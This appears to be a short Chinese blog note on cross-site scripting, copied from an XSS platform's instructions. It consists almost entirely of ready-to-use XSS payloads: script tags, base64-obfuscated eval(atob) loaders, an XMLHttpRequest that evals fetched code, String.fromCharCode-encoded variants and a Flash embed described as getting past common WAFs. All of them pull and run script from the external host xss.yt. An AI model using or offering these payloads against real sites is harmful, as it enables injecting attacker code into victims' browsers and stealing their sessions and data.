---
title: XSS
date: 2023-04-16 08:12:01
categories:
- 网络安全
tags:
- xss
- web
description: |
    跨站攻击脚本
---
[XSS平台](https://xss.yt/index/user.html)

```bash
将如下代码植入怀疑出现xss的地方（注意'的转义），即可在 项目内容 观看XSS效果。

当前项目URL地址为：https://xss.yt/YLgl        【注意新增https，插入对方网站代码前缀http或者https都可】

</tExtArEa>'"><sCRiPt sRC=//xss.yt/YLgl></sCrIpT>
或者

'"><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnl0L1lMZ2wiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 autofocus>
'"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnl0L1lMZ2wiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>
'"><video><source onerror=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnl0L1lMZ2wiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7>
'"><script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "https://xss.yt/YLgl");a.send();</script>
<img src=x onerror=s=createElement('script');body.appendChild(s);s.src='//xss.yt/YLgl';>
下方XSS代码过一般WAF [注意如果直接把代码放入Burp，111则需要把下方代码进行URL编码]

<embed src=https://xss.yt/liuyan/xs.swf?a=e&c=docu0075ment.write(Stu0072ing.fromu0043harCode(60,115,67,82,105,80,116,32,115,82,67,61,47,47,120,115,115,46,121,116,47,89,76,103,108,62,60,47,115,67,114,73,112,84,62)) allowscriptaccess=always type=application/x-shockwave-flash></embed>
若使用下方XSS代码请注意(下面代码会引起网页空白不得已慎用，注意如果使用下面的代码，一定要勾选"基础默认XSS"模块)

<img src="" onerror="document.write(String.fromCharCode(60,115,67,82,105,80,116,32,115,82,67,61,47,47,120,115,115,46,121,116,47,89,76,103,108,62,60,47,115,67,114,73,112,84,62))">
↓↓↓！~极限代码~！(可以不加最后的>回收符号，下面代码已测试成功)↓↓↓

<sCRiPt/SrC=//xss.yt/YLgl>
```
